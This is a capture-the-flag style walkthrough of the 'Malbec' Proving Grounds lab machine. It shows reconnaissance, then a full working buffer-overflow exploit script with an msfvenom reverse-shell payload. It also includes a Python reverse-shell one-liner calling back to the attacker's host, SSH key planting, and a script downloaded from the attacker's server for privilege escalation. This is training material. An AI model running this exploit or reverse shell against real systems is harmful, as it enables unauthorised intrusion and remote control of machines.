# Malbec

https://www.reddit.com/r/oscp/comments/nigb7m/great_oscp_practice/

# Enumeration

## rustscan

```bash
┌──(kali㉿kali)-[~]
└─$ rustscan -a 192.168.140.129                         
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.140.129:22
Open 192.168.140.129:2121
Open 192.168.140.129:7138
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-20 01:27 EST
Initiating Ping Scan at 01:27
Scanning 192.168.140.129 [2 ports]
Completed Ping Scan at 01:27, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:27
Completed Parallel DNS resolution of 1 host. at 01:27, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:27
Scanning 192.168.140.129 [3 ports]
Discovered open port 22/tcp on 192.168.140.129
Discovered open port 7138/tcp on 192.168.140.129
Discovered open port 2121/tcp on 192.168.140.129
Completed Connect Scan at 01:27, 0.17s elapsed (3 total ports)
Nmap scan report for 192.168.140.129
Host is up, received conn-refused (0.18s latency).
Scanned at 2022-02-20 01:27:07 EST for 1s

PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack
2121/tcp open  ccproxy-ftp syn-ack
7138/tcp open  unknown     syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

┌──(kali㉿kali)-[~]
└─$ ftp 192.168.140.129 2121
Connected to 192.168.140.129.
220 pyftpdlib 1.5.6 ready.
Name (192.168.140.129:kali): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rwxrwxrwx   1 carlos   carlos     108304 Jan 25  2021 malbec.exe
226 Transfer complete.
ftp> lcd /tmp
Local directory now /tmp
ftp> get malbec.exe
local: malbec.exe remote: malbec.exe
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
108304 bytes received in 0.53 secs (197.9851 kB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ cd /tmp
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ls     
18083.php         systemd-private-bf8dd2a961ea4823b98474c0ef35396e-colord.service-KMjGpj          Temp-4666b9a2-4a9c-42fa-885c-16abd009b55b
hsperfdata_root   systemd-private-bf8dd2a961ea4823b98474c0ef35396e-haveged.service-Tqlgvi         Temp-48eeedea-1786-443e-9889-de773a7f6118
lse.sh            systemd-private-bf8dd2a961ea4823b98474c0ef35396e-ModemManager.service-rDVa6g    wpscan
malbec.exe        systemd-private-bf8dd2a961ea4823b98474c0ef35396e-systemd-logind.service-JF3vti
ssh-Dsg221y7TxxH  systemd-private-bf8dd2a961ea4823b98474c0ef35396e-upower.service-BJLOZg
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ wine malbec.exe       
[+] Malbec started!
[*] Waiting for incoming connections!
^C                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

# Exploitation - Buffer Overflow

## 1. Fuzzing
```python
import os

def genPayload(LHOST, LPORT):
    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"
    badchars = "\\x00\\x11\\x40\\x5f\\xb8\\xee"
    command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+str(LPORT)+" EXITFUNC=thread  -b '"+badchars+"' -f py -o msfpayload.py"
    os.system(command)
    import msfpayload
    payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    return payload
    #######################################################################

def exploit(payload, RHOST, RPORT):
    prefix = ""
    offset = 0
    overflow = "A" * offset
    retn = ""# "\x62\x50\x12\x03"[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = ""
    #payload = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    #print(len(buffer))
    #print([buffer])
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(" "+ buffer)
    
### bad Characters ##############
pp = ""
for x in range(1, 256):
  if x not in [0x0, 0x11, 0x40, 0x5f, 0xb8, 0xee]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
#with open("/tmp/binary.bin", "w") as f: f.write(payload)
##################################### 
 
payload = "" # genPayload('10.8.52.126', 8888)
for offset in range(1000, 2000, 100):
    payload = "A" * offset
    exploit(payload, '192.168.1.6', 7138)
    print(offset)
    a = raw_input()
```

```bash
hacker@hackerbook /r/m/h/W/U/z/D/S/G/S/C/P/O/P/Malbec (master) [1]> python2 exploit.py
1000

1100
```

![](Pasted%20image%2020220305221535.png)

## 2. Crash Replication and controlling EIP

```bash
┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

```python
payload = "" # genPayload('10.8.52.126', 8888)
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
exploit(payload, '192.168.1.6', 7138)

```

![](Pasted%20image%2020220305222516.png)


```bash
┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 6C41336C
[*] Exact match at offset 340
                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 
```


```python

def exploit(payload, RHOST, RPORT):
    prefix = ""
    offset = 340
    overflow = "A" * offset
    retn = "BBBB"# "\x62\x50\x12\x03"[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(""+ buffer)

exploit("", '192.168.1.6', 7138)
```

![](Pasted%20image%2020220305222357.png)


## 3. Bad Characters

```python
import os

def genPayload(LHOST, LPORT):
    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"
    badchars = "\\x00\\x11\\x40\\x5f\\xb8\\xee"
    command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+str(LPORT)+" EXITFUNC=thread  -b '"+badchars+"' -f py -o msfpayload.py"
    os.system(command)
    import msfpayload
    payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    return payload
    #######################################################################

def exploit(payload, RHOST, RPORT):
    prefix = ""
    offset = 340
    overflow = "A" * offset
    retn = "BBBB"# "\x62\x50\x12\x03"[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(""+ buffer)
    
### bad Characters ##############
pp = ""
for x in range(1, 256):
  if x not in [0x0]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
with open("/tmp/binary.bin", "w") as f: f.write(payload)
##################################### 
 
#payload = "" # genPayload('10.8.52.126', 8888)
exploit(payload, '192.168.1.6', 7138)
```

![](Pasted%20image%2020220305222856.png)

![](Pasted%20image%2020220305223045.png)

`!mona compare -f Y:\binary.bin -a `

## 4. Finding Return Address

![](Pasted%20image%2020220305223152.png)

```bash
hacker@hackerbook /r/m/h/W/U/z/D/S/G/S/C/P/O/P/Malbec (master)> ROPgadget --binary malbec.exe | grep 0x41101503
0x41101503 : push esp ; ret
hacker@hackerbook /r/m/h/W/U/z/D/S/G/S/C/P/O/P/Malbec (master)> 
```

## 5. Exploit

```python
import os

def genPayload(LHOST, LPORT):
    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"
    badchars = "\\x00"
    command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+str(LPORT)+" EXITFUNC=thread  -b '"+badchars+"' -f py -o msfpayload.py"
    os.system(command)
    import msfpayload
    payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    return payload
    #######################################################################

def exploit(payload, RHOST, RPORT):
    prefix = ""
    offset = 340
    overflow = "A" * offset
    retn = "\x41\x10\x15\x03"[::-1]
    padding = "\x90"*10 #+ "\xcc"
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(""+ buffer)
    
### bad Characters ##############
pp = ""
for x in range(1, 256):
  if x not in [0x0]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
with open("/tmp/binary.bin", "w") as f: f.write(payload)
##################################### 
 
payload = genPayload('192.168.1.6', 4444)
exploit(payload, '192.168.1.6', 7138)
```

![](Pasted%20image%2020220305223633.png)

```bash
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ python exploit.py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
Saved as: msfpayload.py
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ 
```

```bash
hacker@hackerbook /r/m/h/W/U/z/D/S/G/S/C/P/O/P/Malbec (master) [127]> nc -nlvp 4444
Connection from 192.168.1.6:34466
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\hacker\Desktop>whoami
whoami
suppress-room\hacker

C:\Users\hacker\Desktop>
```

# Actual Exploit
## Buffer Overflow

```python
import os

def genPayload(LHOST, LPORT):
    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"
    badchars = "\\x00"
    command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+str(LPORT)+" EXITFUNC=thread  -b '"+badchars+"' -f py -o msfpayload.py"
    os.system(command)
    import msfpayload
    payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    return payload
    #######################################################################

def exploit(payload, RHOST, RPORT):
    prefix = ""
    offset = 340
    overflow = "A" * offset
    retn = "\x41\x10\x15\x03"[::-1]
    padding = "\x90"*10 #+ "\xcc"
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(""+ buffer)
    
### bad Characters ##############
pp = ""
for x in range(1, 256):
  if x not in [0x0]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
with open("/tmp/binary.bin", "w") as f: f.write(payload)
##################################### 
 
payload = genPayload('192.168.49.168', 7138)
exploit(payload, '192.168.168.129', 7138)
```

```bash
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ python exploit.py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
Saved as: msfpayload.py
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ 

```

```powershell
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 7138                                                                                                                                                   1 ⨯
listening on [any] 7138 ...
connect to [192.168.49.168] from (UNKNOWN) [192.168.168.129] 34106
Microsoft Windows 6.1.7601 (4.0)

Z:\home\carlos>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\home\carlos

  3/5/2022   9:38 AM  <DIR>         .
 1/26/2021   4:42 AM  <DIR>         ..
  3/5/2022   8:57 AM            33  local.txt
 1/26/2021   4:42 AM  <DIR>         sv
       1 file                        33 bytes
       3 directories     11,004,280,832 bytes free


Z:\home\carlos>type local.txt
5c9216ac53ebd9ecd4234a1d1b7c1442

Z:\home\carlos>ipconfig
Ethernet adapter lo

    Connection-specific DNS suffix. . : 
    IPv4 address. . . . . . . . . . . : 127.0.0.1
    Default gateway . . . . . . . . . : 

Ethernet adapter ens192

    Connection-specific DNS suffix. . : 
    IPv4 address. . . . . . . . . . . : 192.168.168.129
    Default gateway . . . . . . . . . : 192.168.168.254


Z:\home\carlos>

```

![](Pasted%20image%2020220305224118.png)

```bash
Z:\home\carlos>cd sv

Z:\home\carlos\sv>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\home\carlos\sv

 1/26/2021   4:42 AM  <DIR>         .
  3/5/2022   9:38 AM  <DIR>         ..
 1/25/2021  12:01 PM       108,304  malbec.exe
       1 file                   108,304 bytes
       2 directories     10,995,294,208 bytes free


Z:\home\carlos\sv>cd \

Z:\>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\

 1/26/2021   4:43 AM  <DIR>         bin
 1/26/2021   4:45 AM  <DIR>         boot
  3/5/2022   9:40 AM  <DIR>         etc
 1/26/2021   4:42 AM  <DIR>         home
 1/26/2021   4:40 AM    26,012,725  initrd.img
10/20/2020   9:17 AM    25,845,515  initrd.img.old
 1/26/2021   4:41 AM  <DIR>         lib
10/20/2020   9:14 AM  <DIR>         lib32
10/20/2020   9:14 AM  <DIR>         lib64
10/20/2020   9:14 AM  <DIR>         libx32
10/20/2020   9:14 AM  <DIR>         lost+found
10/20/2020   9:14 AM  <DIR>         media
10/20/2020   9:14 AM  <DIR>         mnt
10/20/2020   9:14 AM  <DIR>         opt
  3/5/2022   8:57 AM  <DIR>         root
 2/15/2022   7:49 AM  <DIR>         run
 1/26/2021   4:44 AM  <DIR>         sbin
10/20/2020   9:14 AM  <DIR>         srv
  3/5/2022   8:57 AM  <DIR>         tmp
10/20/2020   9:14 AM  <DIR>         usr
10/20/2020   9:14 AM  <DIR>         var
11/28/2020   2:47 AM     5,283,056  vmlinuz
10/18/2020   3:43 AM     5,278,960  vmlinuz.old
       4 files               62,420,256 bytes
      19 directories     10,983,952,384 bytes free


Z:\>
```

## Escape Windows - SSH fail

```powershell
Z:\home\carlos>mkdir .ssh

Z:\home\carlos>cd .ssh

Z:\home\carlos\.ssh>echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali > authorized_keys

Z:\home\carlos\.ssh>type authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali 

Z:\home\carlos\.ssh>
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ cat ~/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i ~/.ssh/id_rsa carlos@192.168.168.129
The authenticity of host '192.168.168.129 (192.168.168.129)' can't be established.
ECDSA key fingerprint is SHA256:TV71PEPS7AhnnK8K5GqGJm91acGTn5mr9GcVYS7rE1A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.168.129' (ECDSA) to the list of known hosts.
carlos@192.168.168.129's password: 
Permission denied, please try again.
carlos@192.168.168.129's password: 
```

## Escape - Change Payload

```bash
[1]  + exit 1     python exploit.py
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ python exploit.py & nc -nlvp 7138                                                                                                                               1 ⨯
[1] 2336
listening on [any] 7138 ...
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=17, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of py file: 597 bytes
Saved as: msfpayload.py
[1]  + done       python exploit.py
whoami
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ p
```

## Escape - Wine

```powershell
start /unix /usr/bin/python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.49.168',7138));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"
```

Must use double quote for the python script, if use single quote, wine won't register the space as part of the argument (eg. `'import socket'`` b`ecomes `'import`)

```powershell
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 7138
listening on [any] 7138 ...
connect to [192.168.49.168] from (UNKNOWN) [192.168.168.129] 34858
Microsoft Windows 6.1.7601 (4.0)

Z:\home\carlos>start /unix /usr/bin/python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.49.168',7138));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"

Z:\home\carlos>
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 7138      
listening on [any] 7138 ...
connect to [192.168.49.168] from (UNKNOWN) [192.168.168.129] 34860
carlos@malbec:/usr/bin$ cd /home
cd /home
carlos@malbec:/home$ ls
ls
carlos
carlos@malbec:/home$ cd carlos
cd carlos
carlos@malbec:~$ ls
ls
local.txt  sv
carlos@malbec:~$ cat local.txt
cat local.txt
e8759dc6eeb08e1fb5a2558ef45dc658
carlos@malbec:~$ ifconfig
ifconfig
bash: ifconfig: command not found
carlos@malbec:~$ cat loca.txt
cat loca.txt
cat: loca.txt: No such file or directory
carlos@malbec:~$ cat local.txt
cat local.txt
e8759dc6eeb08e1fb5a2558ef45dc658
carlos@malbec:~$ /sbin/ifconfig
/sbin/ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.168.129  netmask 255.255.255.0  broadcast 192.168.168.255
        ether 00:50:56:ba:e0:b2  txqueuelen 1000  (Ethernet)
        RX packets 193  bytes 13088 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 36  bytes 3064 (2.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

carlos@malbec:~$ 
```

![](Pasted%20image%2020220306094842.png)

# Privesc

## lse

Attacker Machine

```bash
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 2121
Serving HTTP on 0.0.0.0 port 2121 (http://0.0.0.0:2121/) ...
192.168.168.129 - - [05/Mar/2022 20:49:40] "GET /lse.sh HTTP/1.1" 200 -
```

Target

```bash
carlos@malbec:/tmp$ wget 192.168.49.168:2121/lse.sh
wget 192.168.49.168:2121/lse.sh
--2022-03-05 20:49:40--  http://192.168.49.168:2121/lse.sh
Connecting to 192.168.49.168:2121... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh              100%[===================>]  42.55K   123KB/s    in 0.3s    

2022-03-05 20:49:41 (123 KB/s) - ‘lse.sh’ saved [43570/43570]

carlos@malbec:/tmp$ chmod +x lse.sh
chmod +x lse.sh
carlos@malbec:/tmp$ ./lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges:                                                                                          

---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: carlos
     User ID: 1000
    Password: none
        Home: /home/carlos
        Path: /usr/bin:/bin
       umask: 0022

    Hostname: malbec
       Linux: 4.19.0-13-amd64
Distribution: Debian GNU/Linux 10 (buster)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
